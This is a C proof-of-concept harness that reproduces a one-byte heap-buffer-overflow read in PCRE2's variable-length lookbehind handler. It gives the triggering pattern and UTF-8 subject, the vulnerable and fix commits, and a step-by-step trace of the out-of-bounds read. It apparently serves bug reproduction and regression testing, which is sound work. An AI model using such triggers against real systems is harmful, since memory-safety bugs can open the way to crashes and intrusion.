/*
 * PoC for OSV-2023-673 (labeled OSV-2023-56 in our test directory)
 * Heap-buffer-overflow READ 1 in match() at pcre2_match.c:5795
 *
 * Bug: In the OP_VREVERSE handler (variable-length lookbehind), the forward
 * scanning loop uses FORWARDCHAR(Feptr) to advance past UTF-8 continuation
 * bytes after incrementing Feptr. FORWARDCHAR does not check against the
 * buffer end (mb->end_subject), causing a heap-buffer-overflow read when
 * Feptr reaches end_subject.
 *
 * Fix: Replace FORWARDCHAR(Feptr) with FORWARDCHARTEST(Feptr, mb->end_subject)
 * at pcre2_match.c:5795.
 *
 * Root cause: When Lmin=0 in the variable-length lookbehind (e.g., (?<=x{0,N})),
 * the forward scan loop performs N advances (one per backed-up character).
 * Starting N characters back from the match position, N advances bring Feptr
 * back to the match position. For \z anchored patterns, the match position is
 * at end_subject. The last Feptr++ lands inside the final multi-byte UTF-8
 * character's continuation bytes, and FORWARDCHAR continues advancing past
 * end_subject without bounds checking.
 *
 * Trigger:
 *   Pattern: (?<=x{0,3})\z   (variable-length lookbehind with Lmin=0)
 *   Subject: 0xC3 0x81 0xC3 0x82  (two 2-byte UTF-8 characters, valid UTF-8)
 *   Compile flags: PCRE2_UTF
 *
 * Vulnerable commit: b0b3fc4c4bc4bd8ada9ada3292a28a44570794f1
 * Fix commit: 5f77d022733a5b7e2ff1e3d80b547c0d89811efe
 *
 * Build:
 *   gcc -g -O0 -fsanitize=address -DPCRE2_CODE_UNIT_WIDTH=8 -DHAVE_CONFIG_H \
 *       -I src -I . -o poc_harness poc_harness.c .libs/libpcre2-8.a -lm -lpthread
 */

#define PCRE2_CODE_UNIT_WIDTH 8
#include "pcre2.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    int errorcode;
    PCRE2_SIZE erroroffset;
    pcre2_code *code;
    pcre2_match_data *md;
    int rc;

    /*
     * Pattern: (?<=x{0,3})\z
     * - (?<=x{0,3}) is a variable-length lookbehind compiled to OP_VREVERSE
     *   with Lmin=0 and Lmax=3
     * - \z anchors at absolute end of subject, forcing the match engine to
     *   attempt matching at offset = subject_length
     * - The lookbehind content 'x' will never match the UTF-8 subject bytes,
     *   causing the forward scan to iterate through all backed-up positions
     */
    const char *pattern = "(?<=x{0,3})\\z";

    /*
     * Subject: two 2-byte UTF-8 characters (valid UTF-8)
     * 0xC3 0x81 = U+00C1 (A with acute)
     * 0xC3 0x82 = U+00C2 (A with circumflex)
     *
     * Heap-allocated so AddressSanitizer can precisely detect the 1-byte
     * out-of-bounds read at the end of the buffer.
     */
    unsigned char raw_subject[] = {0xC3, 0x81, 0xC3, 0x82};
    size_t subject_len = sizeof(raw_subject);
    unsigned char *subject = malloc(subject_len);
    if (!subject) {
        fprintf(stderr, "malloc failed\n");
        return 1;
    }
    memcpy(subject, raw_subject, subject_len);

    printf("OSV-2023-673 PoC: heap-OOB READ in OP_VREVERSE FORWARDCHAR\n");
    printf("Pattern: %s\n", pattern);
    printf("Subject: [0xC3, 0x81, 0xC3, 0x82] (%zu bytes, 2 UTF-8 chars)\n", subject_len);
    printf("Flags: PCRE2_UTF\n\n");

    /* Compile with PCRE2_UTF to enable UTF-8 mode */
    code = pcre2_compile((PCRE2_SPTR)pattern, PCRE2_ZERO_TERMINATED,
        PCRE2_UTF, &errorcode, &erroroffset, NULL);
    if (!code) {
        unsigned char errbuf[256];
        pcre2_get_error_message(errorcode, errbuf, sizeof(errbuf));
        fprintf(stderr, "Compile error %d at offset %zu: %s\n",
                errorcode, erroroffset, errbuf);
        free(subject);
        return 1;
    }

    md = pcre2_match_data_create_from_pattern(code, NULL);
    if (!md) {
        fprintf(stderr, "Failed to create match data\n");
        pcre2_code_free(code);
        free(subject);
        return 1;
    }

    printf("Calling pcre2_match... (expect heap-buffer-overflow at line 5795)\n");
    fflush(stdout);

    /*
     * Match: the engine tries matching at each position including end_subject.
     * At end_subject, \z succeeds, triggering the lookbehind. OP_VREVERSE:
     *
     * 1. Backward walk (Lmax=3, but only 2 chars available):
     *    i=0: Feptr-- to byte 3 (0x82), BACKCHAR to byte 2 (0xC3). One char.
     *    i=1: Feptr-- to byte 1 (0x81), BACKCHAR to byte 0 (0xC3). One char.
     *    i=2: Feptr at start_subject. Break. Lmax = 2.
     *    Feptr = 0.
     *
     * 2. Forward scan (Lmin=0):
     *    iter 1: RMATCH at byte 0 (0xC3 != 'x'). Fail.
     *            Lmax-- (2): 2 <= 0? No. Advance.
     *            Feptr++ -> byte 1 (0x81). FORWARDCHAR: 0x81 is continuation.
     *            Feptr++ -> byte 2 (0xC3). Not continuation. Stop. Feptr = 2.
     *    iter 2: RMATCH at byte 2 (0xC3 != 'x'). Fail.
     *            Lmax-- (1): 1 <= 0? No. Advance.
     *            Feptr++ -> byte 3 (0x82). FORWARDCHAR: 0x82 is continuation.
     *            Feptr++ -> byte 4 = end_subject. Read *(byte 4) = OOB READ!
     *
     * The fix changes FORWARDCHAR to FORWARDCHARTEST which checks
     * Feptr < end_subject before reading.
     */
    rc = pcre2_match(code, subject, subject_len, 0, 0, md, NULL);
    printf("Match result: %d\n", rc);

    pcre2_match_data_free(md);
    pcre2_code_free(code);
    free(subject);

    return 0;
}
